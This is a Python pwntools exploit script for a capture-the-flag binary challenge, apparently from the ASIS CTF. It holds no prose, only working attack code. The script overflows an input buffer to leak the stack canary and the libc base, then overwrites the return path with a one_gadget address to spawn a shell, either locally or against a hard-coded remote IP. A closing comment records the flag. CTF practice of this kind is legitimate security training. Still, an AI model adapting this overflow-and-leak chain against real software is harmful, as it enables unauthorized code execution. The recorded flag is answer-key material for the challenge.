from pwn import *
from time import sleep

context.terminal = ["kitty"]
script = """
c
"""

libc = ELF("./libc.so.6")

if args.REMOTE:
    p: tube = remote("65.109.182.44", "5000")
elif args.GDB:
    p: tube = gdb.debug("./chall", gdbscript=script)
else:
    p: tube = process("./chall")

"""
initial money -> 0x3e8
"""
money = 0x3e8

def bet(amount: int):
    global money

    p.recvuntil(b"Lives: ")
    lives = p.recvuntil(b"Y")[:-2]
    p.recvuntil(b"money: ")
    money = int(p.recvline())

    log.info(f"lives: {lives}")
    log.info(f"money: {money}")

    p.sendlineafter(b"value: ", f"{amount}".encode())
    return lives

def guess(n: int):
    p.sendlineafter(b"guess: ", f"{n}".encode())

def feedback(lives: bytes = b"*", m: int = 0, tail: bytes = b""):
    global money

    money = m 
    payload = b"\x00" * 0x800 + lives.ljust(4, b"*") + p32(m) + tail
    p.sendafter(b"round: ", payload)

bet(money+1)
guess(0)
feedback(m=0x41414141, tail=b"\n")

lives = bet(money+1)
canary = u64(b"\x00" + lives.split(b"\n")[1][:7])
log.info(f"canary = {canary:#x}")

guess(0)
feedback(m=0x41414141, tail=b"Z" * 15 + b"\n")

lives = bet(money+1)
libcbase = u64(lives.split(b"\n")[1].ljust(8, b"\x00")) - 0x29d90
log.info(f"libcbase = {libcbase:#x}")

gadget = p64(libcbase + 0xebd3f)

guess(0)
feedback(m=0xffffffff, tail=p64(canary) + p64(libcbase + libc.bss()) + gadget)

p.interactive()

"""
flag: ASIS{0h-n0-607-pwn3d-1-6u355-ab3a2195}
"""